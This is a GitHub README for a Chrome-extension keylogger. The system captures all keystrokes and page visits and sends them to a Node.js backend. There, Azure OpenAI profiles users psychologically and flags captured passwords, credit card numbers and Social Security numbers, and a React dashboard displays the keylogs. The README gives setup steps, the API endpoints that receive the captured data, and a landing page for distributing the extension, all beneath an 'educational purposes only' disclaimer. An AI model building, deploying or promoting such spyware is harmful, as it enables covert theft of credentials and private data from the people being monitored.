# 🔐 Keylogger Extension - Intelligent Surveillance System

Complete monitoring and behavioral analysis system with integrated AI (Azure OpenAI). Composed of a Chrome extension, Node.js backend, React dashboard, and landing page.

## 📋 Table of Contents

- [Architecture](#architecture)
- [Features](#features)
- [Prerequisites](#prerequisites)
- [Quick Start](#quick-start)
- [Installation](#installation)
- [Configuration](#configuration)
- [Usage](#usage)
- [API Documentation](#api-documentation)
- [Project Structure](#project-structure)

---

## 🏗️ Architecture

The project is divided into 4 main components:

```
┌─────────────────┐
│  Chrome         │
│  Extension      │──┐
└─────────────────┘  │
                     │
┌─────────────────┐  │    ┌──────────────────┐
│  Landing        │  │    │  Backend API     │
│  Page           │  ├───▶│  (Node.js)       │
│  (Port 3000)    │  │    │  + AI Analysis   │
└─────────────────┘  │    │  (Port 4000)     │
                     │    └──────────────────┘
┌─────────────────┐  │             │
│  Dashboard      │  │             │
│  React Admin    │──┘             │
│  (Port 5173)    │                │
└─────────────────┘                │
                                   ▼
                          ┌─────────────────┐
                          │  Azure OpenAI   │
                          │  (GPT-4)        │
                          └─────────────────┘
```

### Components

1. **Chrome Extension** (`/extension`)
   - Captures keystrokes and page visits
   - Configurable server settings
   - Sends data to backend

2. **Backend API** (`/keylogger-server`)
   - REST API (Node.js/Express)
   - Data storage (JSON)
   - AI analysis with Azure OpenAI
   - Sensitive data detection
   - URL/data correlation

3. **Admin Dashboard** (`/keylogger-server/dashboard`)
   - Modern React interface (Vite + TypeScript)
   - User and session visualization
   - AI-powered user profile analysis
   - Charts and statistics
   - Search and filters
   - Website grouping

4. **Landing Page** (`/landing-page`)
   - Professional showcase website
   - Extension download (ZIP)
   - Apple-like design

---

## ✨ Features

### 📊 Analytics & Monitoring
- Capture all keystrokes
- Page visit tracking
- Typed text reconstruction
- Form field detection

### 🤖 Artificial Intelligence
- **User persona generation**: Psychological profile based on behavior
- **Session summaries**: Automatic session analysis
- **URL correlation**: Critical data detection based on context (banking, social, ecommerce)
- **Global trends**: General behavioral analysis

### 🔒 Security & Detection
- **Sensitive data detection**:
  - Passwords (password fields)
  - Emails
  - Credit cards
  - Social Security Numbers (SSN)
  - Phone numbers
- **Sensitivity scoring**: Automatic classification (low/medium/high/critical)
- **Security alerts**: Highlight critical sessions

### 📈 Dashboard Features
- User list view with statistics
- Detailed user profiles
- "By Website" tab to group by domain
- Expandable sessions with keylog content
- Risk distribution charts
- Real-time search and filtering

---

## 🔧 Prerequisites

- **Node.js** >= 18.x
- **npm** >= 9.x
- **Azure OpenAI Account** (for AI features)
- **Chrome Browser** (for extension)

---

## 🚀 Quick Start

**The easiest way to get started:**

```bash
# Clone the repository
git clone https://github.com/Cyrilnkl/keylogger-admin-extension-chrome.git
cd keylogger-admin-extension-chrome

# Run the quick start script
./start.sh
```

This will:
1. Install all dependencies
2. Create `.env` file from template (edit with your Azure credentials)
3. Start all 3 services automatically
4. Open the dashboard at http://localhost:5173

---

## 📦 Installation

### Manual Installation

#### 1. Clone the project

```bash
git clone https://github.com/Cyrilnkl/keylogger-admin-extension-chrome.git
cd keylogger-admin-extension-chrome
```

#### 2. Install Backend

```bash
cd keylogger-server
npm install
```

#### 3. Install Dashboard

```bash
cd keylogger-server/dashboard
npm install
```

#### 4. Install Landing Page

```bash
cd landing-page
npm install
```

---

## ⚙️ Configuration

### Backend - Environment Variables

Create a `.env` file in `/keylogger-server`:

```bash
cp keylogger-server/.env.example keylogger-server/.env
```

Edit the `.env` file:

```env
# Azure OpenAI Configuration
AZURE_OPENAI_ENDPOINT=https://your-resource.cognitiveservices.azure.com/
AZURE_OPENAI_API_KEY=your-azure-api-key
AZURE_OPENAI_DEPLOYMENT=gpt-4
AZURE_OPENAI_API_VERSION=2024-02-15-preview

# Server Configuration
PORT=4000
NODE_ENV=development
```

### Getting Azure OpenAI Credentials

1. Create an Azure OpenAI resource at [portal.azure.com](https://portal.azure.com)
2. Deploy a GPT-4 or GPT-3.5 model
3. Get:
   - Endpoint: `Keys and Endpoint` → `Endpoint`
   - API Key: `Keys and Endpoint` → `Key 1`
   - Deployment name: `Deployments` → your deployment name

### Chrome Extension - Configuration

The `extension/config.js` file contains:

```javascript
const SERVER_CONFIG = {
    enabled: true,
    url: 'http://localhost:4000', // Backend URL
    endpoints: {
        keystroke: '/keystroke',
        pageVisit: '/page-visit'
    }
};
```

### Dashboard - API Configuration

The dashboard automatically calls `http://localhost:4000`.

---

## 🚀 Usage

### Local Development

#### 1. Start Backend

```bash
cd keylogger-server
node server.js
```

Server runs on `http://localhost:4000`

#### 2. Start Dashboard

```bash
cd keylogger-server/dashboard
npm run dev
```

Dashboard accessible at `http://localhost:5173`

#### 3. Start Landing Page

```bash
cd landing-page
npm start
```

Landing page at `http://localhost:3000`

#### 4. Install Chrome Extension

1. Open Chrome and go to `chrome://extensions/`
2. Enable "Developer mode" (top right corner)
3. Click "Load unpacked"
4. Select the `/extension` folder
5. Extension installed! 🎉

### Using the Quick Start Script

```bash
./start.sh
```

This starts all services automatically. Press `Ctrl+C` to stop all services.

---

## 📡 API Documentation

### Endpoints

#### Raw Data

```http
POST /batch-data
Content-Type: application/json

{
  "userId": "user123",
  "sessions": [
    {
      "url": "https://example.com",
      "timestamp": "2025-11-21T10:00:00Z",
      "keystrokes": [...]
    }
  ]
}
```

#### Users

```http
GET /api/users
Response: { users: [...], total: 10 }

GET /api/users/:userId
Response: { user details }
```

#### Statistics

```http
GET /api/stats
Response: {
  totalUsers: 10,
  totalSessions: 100,
  totalKeystrokes: 5000,
  avgSessionDuration: 300,
  topDomains: [...]
}
```

#### Artificial Intelligence

```http
# Analyze user profile
GET /api/ai/analyze-user/:userId
Response: {
  persona: "Profile description...",
  cached: false
}

# Analyze session
POST /api/ai/analyze-session
Body: { session: {...} }
Response: { summary: "..." }

# URL correlation
POST /api/ai/correlate-url
Body: { session: {...} }
Response: {
  siteType: "banking",
  detectedData: ["credentials", "payment"],
  shouldHighlight: true,
  concerns: [...],
  recommendations: [...]
}

# Session summary
GET /api/ai/session-summary/:userId/:sessionId

# Global trends
GET /api/ai/global-trends

# Security alerts
GET /api/ai/security-alerts
```

---

## 📁 Project Structure

```
keylogger-extension/
├── extension/                    # Chrome Extension
│   ├── manifest.json            # Extension config
│   ├── background.js            # Service worker
│   ├── content.js               # Capture script
│   ├── config.js                # Server config
│   ├── popup.html/js/css        # Popup interface
│   └── README.md
│
├── keylogger-server/            # Node.js Backend
│   ├── server.js                # Express server
│   ├── ai-analysis.js           # Azure OpenAI module
│   ├── package.json
│   ├── .env.example             # Env variables template
│   ├── data/                    # JSON database
│   │   ├── users.json
│   │   └── ai-cache.json
│   ├── logs/                    # Session logs
│   └── dashboard/               # React Dashboard
│       ├── src/
│       │   ├── App.tsx
│       │   ├── components/
│       │   │   ├── UsersList.tsx
│       │   │   ├── UserProfile.tsx
│       │   │   ├── StatsCards.tsx
│       │   │   ├── KeylogsViewer.tsx
│       │   │   └── SeverityChart.tsx
│       │   └── lib/
│       ├── package.json
│       ├── vite.config.ts
│       └── tailwind.config.js
│
├── landing-page/                # Showcase website
│   ├── server.js                # Express server
│   ├── index.html               # Homepage
│   ├── styles.css               # Styles
│   └── package.json
│
├── start.sh                     # Quick start script
├── .gitignore
└── README.md                    # This file
```

---

## 🔐 Security & Legality

⚠️ **IMPORTANT**: This project is for educational purposes only.

### Warnings

- ❌ **Never use** without explicit user consent
- ❌ **Illegal** in most jurisdictions without authorization
- ❌ **Privacy violation** if misused
- ✅ Use only in educational or research context
- ✅ Always obtain written authorization before any deployment

### Best Practices

1. **Never store** real sensitive data
2. **Encrypt** communications in production (HTTPS)
3. **Anonymize** user data
4. **Respect** GDPR and data protection laws
5. **Document** usage and obtain consent

---

## 🛠️ Development

### Technologies Used

**Backend**
- Node.js 20
- Express.js
- Axios (Azure OpenAI)
- Archiver (ZIP files)

**Frontend Dashboard**
- React 19
- TypeScript
- Vite 7
- Tailwind CSS 3
- Shadcn/UI
- Recharts (charts)
- Framer Motion (animations)

**Extension**
- Vanilla JavaScript
- Chrome Extension Manifest V3

### Available npm Scripts

```bash
# Backend
cd keylogger-server
npm start              # Start server

# Dashboard
cd keylogger-server/dashboard
npm run dev            # Development
npm run build          # Production build
npm run preview        # Preview build

# Landing
cd landing-page
npm start              # Start server
```

---

## 🐛 Troubleshooting

### Backend won't start

```bash
# Check if port 4000 is free
lsof -ti:4000 | xargs kill -9

# Check environment variables
cat keylogger-server/.env

# Check logs
cd keylogger-server
node server.js
```

### Extension won't connect

1. Check backend is running on `http://localhost:4000`
2. Verify `extension/config.js` → `url` is `http://localhost:4000`
3. Open extension console: `chrome://extensions` → "Inspect views"
4. Check network requests in DevTools

### Dashboard shows "No users"

1. Extension must be active and capturing data
2. Browse websites with extension enabled
3. Check `/keylogger-server/data/users.json` contains data
4. Refresh dashboard

### Azure OpenAI: 401/403 error

- Verify API key is correct in `.env`
- Verify endpoint is correct
- Verify deployment exists in Azure

---

## 📝 License

This project is under MIT License. See LICENSE file for details.

---

## 👥 Contributing

Contributions are welcome! Feel free to:

1. Fork the project
2. Create a branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add AmazingFeature'`)
4. Push to branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

---

## 📞 Support

For questions or issues:

- Open an issue on GitHub
- Check Azure OpenAI documentation
- Check backend/dashboard logs

---

## 🎯 Roadmap

- [ ] PostgreSQL/MongoDB support
- [ ] User authentication
- [ ] PDF report export
- [ ] Multi-language support
- [ ] Offline mode
- [ ] End-to-end encryption
- [ ] Unit and E2E tests
- [ ] CI/CD with GitHub Actions
- [ ] Swagger API documentation
- [ ] Mobile responsive dashboard

---

**⚠️ Reminder**: This project is for educational purposes. Use it responsibly and ethically.
